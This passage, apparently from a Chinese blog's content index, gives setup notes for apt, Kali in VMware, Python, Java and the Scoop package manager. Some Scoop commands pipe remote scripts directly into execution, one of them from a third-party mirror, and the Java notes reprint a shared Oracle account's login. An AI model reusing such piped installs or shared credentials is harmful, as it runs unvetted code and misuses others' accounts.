中最常用命令选项的集合。</span><br></pre></td></tr></table></figure><ul><li>虽然 apt  与 apt-get  有一些类似的命令选项，但它并不能完全向下兼容 apt-get  命令。也就是说，可以用 apt  替换部分 apt-get  系列命令，但不是全部。</li><li>apt  可以看作 apt-get  和 apt-cache  命令的子集, 可以为包管理提供必要的命令选项。</li><li>apt-get  虽然没被弃用，但作为普通用户，还是应该首先使用 apt 。</li></ul><table><thead><tr><th align="center">apt 命令</th><th align="center">取代的命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt install</td><td align="center">apt-get install</td><td align="center">安装软件包</td></tr><tr><td align="center">apt remove</td><td align="center">apt-get remove</td><td align="center">移除软件包</td></tr><tr><td align="center">apt purge</td><td align="center">apt-get purge</td><td align="center">移除软件包及配置文件</td></tr><tr><td align="center">apt update</td><td align="center">apt-get update</td><td align="center">刷新存储库索引</td></tr><tr><td align="center">apt upgrade</td><td align="center">apt-get upgrade</td><td align="center">升级所有可升级的软件包</td></tr><tr><td align="center">apt autoremove</td><td align="center">apt-get autoremove</td><td align="center">自动删除不需要的包</td></tr><tr><td align="center">apt full-upgrade</td><td align="center">apt-get dist-upgrade</td><td align="center">在升级软件包时自动处理依赖关系</td></tr><tr><td align="center">apt search</td><td align="center">apt-cache search</td><td align="center">搜索应用程序</td></tr><tr><td align="center">apt show</td><td align="center">apt-cache show</td><td align="center">显示装细节</td></tr></tbody></table><p>当然，apt 还有一些自己的命令：</p><table><thead><tr><th align="center">新的apt命令</th><th align="center">命令的功能</th></tr></thead><tbody><tr><td align="center">apt list</td><td align="center">列出包含条件的包（已安装，可升级等）</td></tr><tr><td align="center">apt edit-sources</td><td align="center">编辑源列表</td></tr></tbody></table><p>需要大家注意的是：apt 命令也还在不断发展， 因此，你可能会在将来的版本中看到新的选项。</p><blockquote><p><a href="https://www.sysgeek.cn/apt-vs-apt-get/">Linux中apt与apt-get命令的区别与解释</a></p></blockquote><h2 id="设置中文"><a href="#设置中文" class="headerlink" title="设置中文"></a>设置中文</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装中文字体</span></span><br><span class="line">apt-get install xfonts-intl-chinese</span><br><span class="line">apt-get install ttf-wqy-microhei</span><br><span class="line"><span class="comment">#设置语言</span></span><br><span class="line">dpkg-reconfigure locales</span><br><span class="line"><span class="comment">#进入图形界面，选中 en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8 并将 zh_CN.UTF-8 选为默认。（空格是选择，tab是切换， * 是选中）</span></span><br><span class="line">重启</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><strong>Kali工具</strong>:</p><ul><li><a href="https://tools.kali.org/tools-listing">https://tools.kali.org/tools-listing</a></li><li><a href="https://github.com/Jack-Liang/kalitools">https://github.com/Jack-Liang/kalitools</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
          <category> Kali&amp;Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 网络配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Kali配置与使用</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&amp;Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Kali&amp;Linux/Linux-Kali%E9%85%8D%E7%BD%AE%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<p>建议虚拟机搞kali~</p><h1 id="VMware安装"><a href="#VMware安装" class="headerlink" title="VMware安装"></a>VMware安装</h1><ol><li>通过scoop进行安装</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、安装软件镜像包源 scoop bucket add scoopet https://github.com/ivaquero/scoopet.git</span><br><span class="line">2、通过搜索 scoop search vmware</span><br><span class="line">3、进行下载安装 scoop install vmware-workstation-pro</span><br></pre></td></tr></table></figure><ol start="2"><li>下载vmware</li></ol><blockquote><p>Vmware官网：<a href="https://www.vmware.com/">https://www.vmware.com/</a></p></blockquote><ol start="3"><li>激活vmware</li></ol><h1 id="Kali简介"><a href="#Kali简介" class="headerlink" title="Kali简介"></a>Kali简介</h1><blockquote><p><a href="https://www.kali.org/docs/introduction/what-is-kali-linux/">https://www.kali.org/docs/introduction/what-is-kali-linux/</a></p></blockquote><h2 id="Kali下载"><a href="#Kali下载" class="headerlink" title="Kali下载"></a>Kali下载</h2><blockquote><p>Kali官网下载：</p><p>Get Kali | Kali Linux：<a href="https://www.kali.org/get-kali/">https://www.kali.org/get-kali/</a></p><p><a href="https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z">https://kali.download/virtual-images/kali-2022.1/kali-linux-2022.1-vmware-amd64.7z</a></p></blockquote><h1 id="Vmware安装Kali"><a href="#Vmware安装Kali" class="headerlink" title="Vmware安装Kali"></a>Vmware安装Kali</h1><p>解压下载的压缩包 kali-linux-2022.1-vmware-amd64.7z , 双击打开下.vmx 文件</p><p>点击 开启此虚拟机 ，即可启动。</p><p>系统已经配置好默认普通用户 kali ，默认密码 kali </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
          <category> Kali&amp;Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python环境安装</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Python%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows安装Python2-x2F-3"><a href="#Windows安装Python2-x2F-3" class="headerlink" title="Windows安装Python2&#x2F;3"></a>Windows安装Python2&#x2F;3</h1><h2 id="通过scoop安装"><a href="#通过scoop安装" class="headerlink" title="通过scoop安装"></a>通过scoop安装</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、添加versions镜像源 scoop bucket add versions</span><br><span class="line">2、通过命令进行搜索 scoop search python</span><br><span class="line">3、选定对应的python版本进行安装</span><br><span class="line">scoop install python27</span><br><span class="line">scoop install python</span><br></pre></td></tr></table></figure><h2 id="Python官网下载安装"><a href="#Python官网下载安装" class="headerlink" title="Python官网下载安装"></a>Python官网下载安装</h2><h3 id="下载安装程序："><a href="#下载安装程序：" class="headerlink" title="下载安装程序："></a>下载安装程序：</h3><blockquote><p><a href="https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe">https://www.python.org/ftp/python/3.7.7/python-3.7.7-amd64.exe</a></p><p><a href="https://www.python.org/downloads/release/python-377/">https://www.python.org/downloads/release/python-377/</a></p></blockquote><p>Customize installation：自定义安装pip、IDLE、安装路径等</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180111556.png" alt="image-20220818011126154" style="zoom:50%;" /><h3 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h3><ol><li>点击此电脑选择高级系统设置，在选择环境变量</li><li>找到path</li><li>添加python的安装路径到此处即可</li><li>添加pip的环境变量，同理，pip在python的scripts目录下及添加到path中即可</li></ol><h3 id="验证安装"><a href="#验证安装" class="headerlink" title="验证安装"></a>验证安装</h3><ol><li>使用windows+R键，打开cmd输入python显示出python版本既配置成功</li><li>pip配置是否成功。输入pip3 看是否提示出帮助信息。</li></ol><h1 id="Linux安装Python2-x2F-3"><a href="#Linux安装Python2-x2F-3" class="headerlink" title="Linux安装Python2&#x2F;3"></a>Linux安装Python2&#x2F;3</h1><h2 id="一些注意事项："><a href="#一些注意事项：" class="headerlink" title="一些注意事项："></a>一些注意事项：</h2><p>在linux中存在多个版本python，这个时候，我们如果想在指定版本的目录里安装相应的模块，应该是使用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install --target=目标路径  工具包名字</span><br></pre></td></tr></table></figure><blockquote><p>参考：<a href="https://blog.csdn.net/qq_33547191/article/details/86552214">https://blog.csdn.net/qq_33547191/article/details/86552214</a></p></blockquote><h2 id="安装Python2"><a href="#安装Python2" class="headerlink" title="安装Python2"></a>安装Python2</h2><p>一般Linux系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3"><a href="#安装Python3" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p /usr/local/python3</span><br><span class="line">yum -y install wget gcc libffi-devel</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.7/Python-3.7.7.tgz</span><br><span class="line">tar -zxf Python-3.7.7.tgz</span><br><span class="line"><span class="built_in">cd</span> Python-3.7.7</span><br><span class="line">./configure --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>修改PATH环境变量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /usr/local/python3/bin/python3 /usr/bin/python3</span><br><span class="line">yum –y install python3-pip</span><br><span class="line">将/usr/local/python3/bin加入PATH：</span><br><span class="line">vim /etc/profile</span><br><span class="line">PATH=<span class="variable">$PATH</span>:/usr/local/python3/bin</span><br></pre></td></tr></table></figure><p>python3默认版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/profile.d/python.sh           <span class="comment">#编辑用户自定义配置，输入alias参数</span></span><br><span class="line"><span class="built_in">alias</span> python=<span class="string">&#x27;/usr/local/bin/python3.8&#x27;</span>    <span class="comment">#这里写你的python路径</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile.d/python.sh         <span class="comment">#重启会话使配置生效</span></span><br></pre></td></tr></table></figure><h1 id="Mac安装Python2-x2F-3"><a href="#Mac安装Python2-x2F-3" class="headerlink" title="Mac安装Python2&#x2F;3"></a>Mac安装Python2&#x2F;3</h1><p>系统默认安装Python2.7，因此无需额外安装</p><h2 id="安装Python3-1"><a href="#安装Python3-1" class="headerlink" title="安装Python3"></a>安装Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">brew install python3</span><br></pre></td></tr></table></figure><h2 id="不同版本Python路径"><a href="#不同版本Python路径" class="headerlink" title="不同版本Python路径"></a>不同版本Python路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统默认(2.7)：</span><br><span class="line">/System/Library/Frameworks/Python.framework/Versions/2.7</span><br><span class="line">brew安装(2.7/3.x)：</span><br><span class="line">/usr/local/Cellar/python</span><br><span class="line">官网pkg安装(3.x)</span><br><span class="line">/Library/Frameworks/Python.framework/Versions/3.x</span><br></pre></td></tr></table></figure><h2 id="配置Python2和Python3"><a href="#配置Python2和Python3" class="headerlink" title="配置Python2和Python3"></a>配置Python2和Python3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br><span class="line"># Setting PATH for Python 2.7</span><br><span class="line">PATH=&quot;/System/Library/Frameworks/Python.framework/Versions/2.7/bin:$&#123;PATH&#125;&quot;</span><br><span class="line">export PATH</span><br><span class="line"># Setting PATH for Python 3.x</span><br><span class="line">PATH=&quot;/usr/local/Cellar/python/3.x/bin:$&#123;PATH&#125;&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">alias python2=&#x27;/System/Library/Frameworks/Python.framework/Versions/2.7/bin/python2.7&#x27;</span><br><span class="line">alias python3=&#x27;/usr/local/Cellar/python/3.x/bin/python3.x&#x27;</span><br><span class="line">source ~/.bash_profile</span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure><h1 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h1><h2 id="pip简介"><a href="#pip简介" class="headerlink" title="pip简介"></a>pip简介</h2><p>pip 是一个 Python 包安装与管理工具。Kali2022 默认安装 python2.7 和 python3. 9 ，但需自行配置 pip</p><p>python pip各版本的安装，最好用脚本下载，</p><h2 id="apt安装方式"><a href="#apt安装方式" class="headerlink" title="apt安装方式"></a>apt安装方式</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install python3-pip </span><br><span class="line">apt install python-pip</span><br></pre></td></tr></table></figure><h2 id="脚本下载安装方式"><a href="#脚本下载安装方式" class="headerlink" title="脚本下载安装方式"></a>脚本下载安装方式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pip3 清华源下载</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py   </span><br><span class="line">python get-pip.py -i https://pypi.tuna.tsinghua.edu.cn/simple/</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip2：</span></span><br><span class="line">curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip2.py</span><br><span class="line">python2 get-pip2.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#pip3：</span></span><br><span class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip3.py</span><br><span class="line">python3 get-pip3.py &amp; pip3 list</span><br></pre></td></tr></table></figure><h2 id="pip安装-Python-库"><a href="#pip安装-Python-库" class="headerlink" title="pip安装 Python 库"></a>pip安装 Python 库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo pip3 install pwntools</span><br><span class="line">pip使用国内代理：</span><br><span class="line">pip3 install -r requirements.txt -i https://mirrors.ustc.edu.cn/pypi/web/simple</span><br></pre></td></tr></table></figure><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul><li>python site-packages目录：</li></ul><p>python第三方包都安装到了site-packages目录下了。 我们可以通过下面的python代码来找到它的位置：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure><ul><li>python安装第三方包的安装路径，dist-packages和site-packages区别：</li></ul><p>简单来说便是，如果是系统自带的python，会使用dist-packages目录；如果你手动安装python，它会直接使用目录site-packages。</p><blockquote><p>参考：<a href="https://blog.csdn.net/cc1949/article/details/78286224">https://blog.csdn.net/cc1949/article/details/78286224</a></p></blockquote><ul><li>pip、pip2和pip3区别：</li></ul><p>pip和pip2相同，均对应Python2.x版本。pip3对应Python3.x版本。</p><p>对应版本下载对应版本的模块</p><blockquote><p>参考：<a href="http://www.javashuo.com/article/p-snbrspvb-my.html">http://www.javashuo.com/article/p-snbrspvb-my.html</a></p></blockquote><ul><li>多个python版本共存问题</li></ul><p>python安装时，注意到环境变量path的配置是为了在命令行可以直接使用相关的.exe文件，</p><p>我们将python2.7和python3.8，目录都引入path中，再将两个目录下的python.exe，更名为python2.exe和python3.exe，这样在cmd中使用python时，不会冲突</p><p>另外需要修改在Windows起始栏的快捷位置：</p><p>注意目标位置和起始位置：这些都是要修改的，我只修改了python3的，因为python idle用python3来执行。如果要用python2，用命令行来执行</p><p>起始位置：”D:\Program Files (x86)\python3.8”</p><p>目标：”D:\Program Files (x86)\python3.8\pythonw.exe” “D:\Program Files (x86)\python3.8\Lib\idlelib\idle.pyw”</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208180122330.png" alt="image-20220818012259063" style="zoom: 33%;" /><p>关于python2，因为其是以msi形式安装的，很难去修改路径，出了很多问题，所以改python.exe安装</p><p>艹了，妈的，python2和3都重装！！</p><ul><li>讲到Linux基础，我归纳入Linux学习部分</li><li>python3.8版本降低至3.6，怎么合理选择自己想要的python版本，怎么设置！？？</li></ul><blockquote><p><a href="https://blog.csdn.net/weixin_42919435/article/details/109523985">https://blog.csdn.net/weixin_42919435/article/details/109523985</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java环境安装</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/Java%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><ul><li>java安装时，jdk和jre尽量不在同一个目录</li><li>关于jdk8以上版本的jdk，jre文件夹是运行Java程序必不可少的运行环境，比如我们在玩Java版的Minecraft时就必须配置jre的路径。通常我们给用户使用的Java程序中都需要有jre来运行，我们自己做小项目时也是需要jre的。不走运的是新版本的jdk中似乎没有jre的存在，这是因为在Java8之后在安装jdk时便不再提供jre的安装，而是让我们根据自己的需要自行的安装，接下来我会展示如何自己安装jre文件夹（以Java11为例）。</li></ul><blockquote><p>原文链接：<a href="https://blog.csdn.net/qq_41219157/article/details/109667631">https://blog.csdn.net/qq_41219157/article/details/109667631</a></p></blockquote><h1 id="Windows安装JDK8"><a href="#Windows安装JDK8" class="headerlink" title="Windows安装JDK8"></a>Windows安装JDK8</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过scoop安装</span><br><span class="line">scoop添加官方镜像源（如添加不成功可使用代理方式）</span><br><span class="line">1、通过命令 scoop bucket known 查看官方镜像</span><br><span class="line">2、添加官方包源 scoop bucket add java</span><br><span class="line">3、查看添加成功的源 scoop bucket list</span><br><span class="line">通过scoop安装 </span><br><span class="line">1、通过scoop搜索jdk scoop search jdk8</span><br><span class="line">2、选择对于版本进行下载安装</span><br><span class="line">3、验证安装</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">手动安装</span><br><span class="line">下载 JDK8</span><br><span class="line">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</span><br><span class="line">账号密码：https://blog.csdn.net/Virgil_K2017/article/details/90260880</span><br><span class="line">账号： liwei@xiaostudy.com </span><br><span class="line">密码： OracleTest1234</span><br><span class="line">安装 JDK8</span><br><span class="line">配置 PATH  环境变量</span><br><span class="line">Win + R  快捷键打开运行窗口，输入 sysdm.cpl  打开系统属性，选择高级，环境变量</span><br><span class="line"> </span><br><span class="line">新建如下环境变量及值：</span><br><span class="line">变量：Java_Home</span><br><span class="line">值：C:\Program Files\Java</span><br><span class="line"> </span><br><span class="line">变量：CLASSPATH</span><br><span class="line">值：.;%Java_Home%\jdk1.8.0_321\bin;%Java_Home%\jdk1.8.0_321\lib\dt.jar;%Java_Home%\jdk1.8.0_321\lib\tools.jar</span><br><span class="line"></span><br><span class="line">变量：Path</span><br><span class="line">值：%Java_Home%\jdk1.8.0_321\bin</span><br><span class="line">    %Java_Home%\jre1.8.0_321\bin</span><br><span class="line">验证安装</span><br><span class="line">Win + R  运行窗口输入 cmd  打开命令提示符，输入 java -version 、 javac -version</span><br></pre></td></tr></table></figure><h1 id="Linux安装JDK8"><a href="#Linux安装JDK8" class="headerlink" title="Linux安装JDK8"></a>Linux安装JDK8</h1><ol><li>切换linux java及javac版本：</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">切换java：</span><br><span class="line">update-alternatives --config java</span><br><span class="line">切换javac：</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://blog.xsot.cn/archives/illegalreflective.html">https://blog.xsot.cn/archives/illegalreflective.html</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">包管理器安装（新手推荐）：</span><br><span class="line"><span class="comment"># centos、redhat等</span></span><br><span class="line">yum -y list java*</span><br><span class="line">yum install java-1.8.0-openjdk* -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># debian、ubuntu、kali等</span></span><br><span class="line">apt-cache search java | grep jdk</span><br><span class="line">apt install openjdk-8-jre-headless</span><br><span class="line">apt install openjdk-8-jdk-headless</span><br><span class="line">apt install openjdk-11-jdk</span><br><span class="line"></span><br><span class="line">源码安装（新手不推荐）：</span><br><span class="line">mdkir /usr/java</span><br><span class="line"><span class="built_in">cd</span> /usr/java</span><br><span class="line">tar -zxvf jdk-8u241-linux-x64.tar.gz</span><br><span class="line"><span class="built_in">mv</span> jdk-1.8._241 jdk8</span><br><span class="line">vim /etc/profile    <span class="comment"># 编辑profile配置文件，添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/java/jdk8</span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:<span class="variable">$CLASSPATH</span></span><br><span class="line"><span class="built_in">export</span> JAVA_PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$&#123;JRE_HOME&#125;</span>/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$&#123;JAVA_PATH&#125;</span></span><br><span class="line"></span><br><span class="line">验证安装：</span><br><span class="line"><span class="built_in">source</span> /etc/profile        <span class="comment">#让配置生效</span></span><br><span class="line">java --version</span><br></pre></td></tr></table></figure><h1 id="Mac安装JDK8"><a href="#Mac安装JDK8" class="headerlink" title="Mac安装JDK8"></a>Mac安装JDK8</h1><blockquote><p>Java Downloads | Oracle: <a href="https://www.oracle.com/java/technologies/downloads/#java8-mac">https://www.oracle.com/java/technologies/downloads/#java8-mac</a></p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">vim  .bash_profile</span><br><span class="line"><span class="built_in">export</span> </span><br><span class="line">JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/(java安装目录)</span><br><span class="line"><span class="built_in">source</span> .bash_profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scoop 包管理器</title>
      <link href="/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"/>
      <url>/2022-08-18-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7/scoop-%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Scoop简介"><a href="#Scoop简介" class="headerlink" title="Scoop简介"></a>Scoop简介</h1><blockquote><p>更多信息查看官网：<a href="https://scoop.sh/">https://scoop.sh</a></p></blockquote><p>Windows命令行包管理工具</p><ul><li>命令行安装软件</li><li>命令行管理软件</li><li>自动配置环境变量</li><li>自动管理程序依赖</li></ul><h1 id="Scoop安装"><a href="#Scoop安装" class="headerlink" title="Scoop安装"></a>Scoop安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在 PowerShell 中打开远程权限</span><br><span class="line">Set-ExecutionPolicy RemoteSigned -scope CurrentUser;</span><br><span class="line">2. 自定义 Scoop 安装目录</span><br><span class="line">$env:SCOOP=&#x27;D:\scoop&#x27;</span><br><span class="line"># 用户环境变量</span><br><span class="line">[Environment]::SetEnvironmentVariable(&#x27;SCOOP&#x27;, $env:SCOOP, &#x27;User&#x27;)</span><br><span class="line"># 系统环境变量</span><br><span class="line"># [Environment]::SetEnvironmentVariable(&#x27;SCOOP_GLOBAL&#x27;, $env:SCOOP_GLOBAL, &#x27;Machine&#x27;)</span><br><span class="line">如果跳过该步骤， Scoop 将默认把所有用户安装的 App 和 Scoop 本身置于 C:\Users\user_name\scoop</span><br><span class="line">3. 下载并安装 Scoop</span><br><span class="line">iwr -useb get.scoop.sh | iex</span><br><span class="line">Initializing...</span><br><span class="line">Downloading...</span><br><span class="line">Extracting...</span><br><span class="line">Creating shim...</span><br><span class="line">Adding D:\scoop\shims to your path.</span><br><span class="line">Scoop was installed successfully!</span><br><span class="line">Type &#x27;scoop help&#x27; for instructions.</span><br><span class="line">scoop update</span><br><span class="line">==+国内镜像</span><br><span class="line">iwr -useb https://gitee.com/glsnames/scoop-installer/raw/master/bin/install.ps1 </span><br><span class="line">| iex</span><br><span class="line">scoop config SCOOP_REPO &#x27;https://gitee.com/glsnames/scoop-installer&#x27;</span><br><span class="line">scoop update</span><br><span class="line">4. 安装软件包</span><br><span class="line">scoop install &lt;app_name&gt;</span><br><span class="line">scoop install sudo</span><br><span class="line">5. 查看 Scoop 使用简介</span><br><span class="line">scoop help</span><br><span class="line">alias       管理 scoop 别名</span><br><span class="line">bucket      管理 Scoop buckets</span><br><span class="line">cache       显示或清除下载缓存</span><br><span class="line">cat         显示指定清单的内容。如果有的话，`bat&#x27;将被用于漂亮地打印JSON。</span><br><span class="line">checkup     检查潜在问题</span><br><span class="line">cleanup     通过删除旧版本清理应用程序</span><br><span class="line">config      获取或设置配置值</span><br><span class="line">create      创建自定义应用程序清单</span><br><span class="line">depends     列出一个应用程序的依赖项</span><br><span class="line">download    下载缓存文件夹中的应用程序并验证哈希值</span><br><span class="line">export      导出（可导入）已安装的应用程序的列表</span><br><span class="line">help        显示一个命令的帮助</span><br><span class="line">hold        按住一个应用程序以禁用更新</span><br><span class="line">home        打开应用程序的主页</span><br><span class="line">info        显示一个应用程序的信息</span><br><span class="line">install     安装应用</span><br><span class="line">list        列出已安装的应用程序</span><br><span class="line">prefix      返回指定应用程序的路径</span><br><span class="line">reset       重置一个应用程序以解决冲突</span><br><span class="line">search      搜索可用的应用程序</span><br><span class="line">shim        操纵Scoop shims</span><br><span class="line">status      显示状态并检查新的应用程序版本</span><br><span class="line">unhold      解除对一个应用程序的控制，使其能够更新</span><br><span class="line">uninstall   卸载一个应用程序</span><br><span class="line">update      新应用程序或Scoop本身</span><br><span class="line">virustotal  在virustotal.com上寻找应用程序的哈希值</span><br><span class="line">which       找到一个shim/executable（类似于Linux上的&#x27;which&#x27;）</span><br></pre></td></tr></table></figure><h1 id="Scoop使用"><a href="#Scoop使用" class="headerlink" title="Scoop使用"></a>Scoop使用</h1><ol><li>添加bucket</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># powershell添加代理</span><br><span class="line">$Env:HTTP_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">$Env:HTTPS_PROXY = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># cmd添加代理</span><br><span class="line">set http_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line">set https_proxy = &quot;http://127.0.0.1:7890&quot;</span><br><span class="line"># 添加 bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 列出添加的 bucket</span><br><span class="line">scoop bucket list</span><br><span class="line">Name Source                                 Updated           Manifests</span><br><span class="line">---- ------                                 -------           ---------</span><br><span class="line">main https://github.com/ScoopInstaller/Main 2022/5/3 20:31:35      1015</span><br><span class="line"># 查看官方推荐的 bucket</span><br><span class="line">scoop bucket known</span><br><span class="line">main</span><br><span class="line">extras</span><br><span class="line">versions</span><br><span class="line">nirsoft</span><br><span class="line">php</span><br><span class="line">nerd-fonts</span><br><span class="line">nonportable</span><br><span class="line">java</span><br><span class="line">games</span><br></pre></td></tr></table></figure><ol start="2"><li>安装应用：以 7zip  为例</li></ol><blockquote><p><a href="https://scoop.sh/#/apps?q=7zip">https://scoop.sh/#/apps?q=7zip</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搜索 7zip 应用</span><br><span class="line">scoop search 7zip</span><br><span class="line">&#x27;main&#x27; bucket:</span><br><span class="line">    7zip (21.07)</span><br><span class="line">    7zip19.00-helper (19.00)</span><br><span class="line"># 添加 main bucket</span><br><span class="line">scoop bucket add main</span><br><span class="line"># 安装 7zip</span><br><span class="line">scoop install 7zip</span><br><span class="line">Installing &#x27;7zip&#x27; (21.07) [64bit]</span><br><span class="line">7z2107-x64.msi (1.8 MB) </span><br><span class="line">[===============================================================================</span><br><span class="line">======] 100%</span><br><span class="line">Checking hash of 7z2107-x64.msi ... ok.</span><br><span class="line">Extracting 7z2107-x64.msi ... done.</span><br><span class="line">Linking D:\scoop\apps\7zip\current =&gt; D:\scoop\apps\7zip\21.07</span><br><span class="line">Creating shim for &#x27;7z&#x27;.</span><br><span class="line">Creating shortcut for 7-Zip (7zFM.exe)</span><br><span class="line">Persisting Codecs</span><br><span class="line">Persisting Formats</span><br><span class="line">Running post-install script...</span><br><span class="line">&#x27;7zip&#x27; (21.07) was installed successfully!</span><br><span class="line">Notes</span><br><span class="line">-----</span><br><span class="line">Add 7-Zip as a context menu option by running: </span><br><span class="line">&quot;D:\scoop\apps\7zip\current\install-context.reg&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>查看 scoop 安装的应用</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scoop list</span><br><span class="line">Installed 